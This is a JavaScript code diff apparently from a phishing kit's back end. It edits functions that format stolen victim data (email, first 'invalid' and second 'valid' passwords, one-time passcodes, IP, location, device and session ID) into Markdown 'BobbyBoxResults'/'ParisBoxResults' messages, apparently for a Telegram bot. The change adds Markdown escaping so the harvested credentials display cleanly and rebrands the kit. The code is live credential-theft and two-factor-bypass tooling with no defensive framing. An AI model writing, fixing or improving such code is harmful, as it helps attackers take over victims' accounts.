@@ -58,6 +58,12 @@ const getDeviceDetails = (userAgent) => {
   };
 };
 
+// --- Markdown Escaping ---
+const escapeMarkdown = (text) => {
+  if (!text) return text;
+  return String(text).replace(/\\/g, '\\\\').replace(/[_*`\[]/g, '\\$&');
+};
+
 // --- Message Composers ---
 
 /**
@@ -72,7 +78,19 @@ const composeCredentialsMessage = (data) => {
         clientIP, location, deviceDetails, timestamp, sessionId,
     } = data;
 
-    const passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
+    const safeEmail = escapeMarkdown(email || 'Not captured');
+    const safeFirstPw = escapeMarkdown(firstAttemptPassword);
+    const safeSecondPw = escapeMarkdown(secondAttemptPassword);
+    const safeProvider = escapeMarkdown(provider || 'Others');
+    const safeIP = escapeMarkdown(clientIP);
+    const safeRegion = escapeMarkdown(location.regionName);
+    const safeCountry = escapeMarkdown(location.country);
+    const safeOS = escapeMarkdown(deviceDetails.os);
+    const safeBrowser = escapeMarkdown(deviceDetails.browser);
+    const safeDevice = escapeMarkdown(deviceDetails.deviceType);
+    const safeSessionId = escapeMarkdown(sessionId);
+
+    const passwordSection = `🔑 First (invalid): ${safeFirstPw}\n🔑 Second (valid): ${safeSecondPw}`;
 
     const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
@@ -81,23 +99,23 @@ const composeCredentialsMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔐 BobbyBoxResults - Credentials 🔐*
+*🔐 ParisBoxResults - Credentials 🔐*
 
 *ACCOUNT DETAILS*
-- 📧 Email: \`${email || 'Not captured'}\`
-- 🏢 Provider: *${provider || 'Others'}*
+- 📧 Email: ${safeEmail}
+- 🏢 Provider: *${safeProvider}*
 - ${passwordSection}
 
 *DEVICE & LOCATION*
-- 📍 IP Address: \`${clientIP}\`
-- 🌍 Location: *${location.regionName}, ${location.country}*
-- 💻 OS: *${deviceDetails.os}*
-- 🌐 Browser: *${deviceDetails.browser}*
-- 🖥️ Device Type: *${deviceDetails.deviceType}*
+- 📍 IP Address: ${safeIP}
+- 🌍 Location: *${safeRegion}, ${safeCountry}*
+- 💻 OS: *${safeOS}*
+- 🌐 Browser: *${safeBrowser}*
+- 🖥️ Device Type: *${safeDevice}*
 
 *SESSION INFO*
 - 🕒 Timestamp: *${formattedTimestamp}*
-- 🆔 Session ID: \`${sessionId}\`
+- 🆔 Session ID: ${safeSessionId}
 `;
 };
 
@@ -109,8 +127,13 @@ const composeCredentialsMessage = (data) => {
  */
 const composeOtpMessage = (data) => {
     const { otp, session } = data;
-    // Fallback to empty object if session is missing
-    const { email, provider, clientIP, location, deviceDetails, sessionId } = session || {};
+    const { email, provider, clientIP, sessionId } = session || {};
+
+    const safeOtp = escapeMarkdown(otp);
+    const safeEmail = escapeMarkdown(email || 'N/A');
+    const safeProvider = escapeMarkdown(provider || 'N/A');
+    const safeIP = escapeMarkdown(clientIP || 'N/A');
+    const safeSessionId = escapeMarkdown(sessionId);
 
     const formattedTimestamp = new Date().toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
@@ -119,16 +142,16 @@ const composeOtpMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔑 BobbyBoxResults - OTP Code 🔑*
+*🔑 ParisBoxResults - OTP Code 🔑*
 
 *VERIFICATION CODE*
-- 🔢 OTP Code: \`${otp}\`
+- 🔢 OTP Code: ${safeOtp}
 
 *ASSOCIATED SESSION*
-- 📧 Email: \`${email || 'N/A'}\`
-- 🏢 Provider: *${provider || 'N/A'}*
-- 📍 IP Address: \`${clientIP || 'N/A'}\`
-- 🆔 Session ID: \`${sessionId}\`
+- 📧 Email: ${safeEmail}
+- 🏢 Provider: *${safeProvider}*
+- 📍 IP Address: ${safeIP}
+- 🆔 Session ID: ${safeSessionId}
 
 *SUBMITTED AT*
 - 🕒 Timestamp: *${formattedTimestamp}*
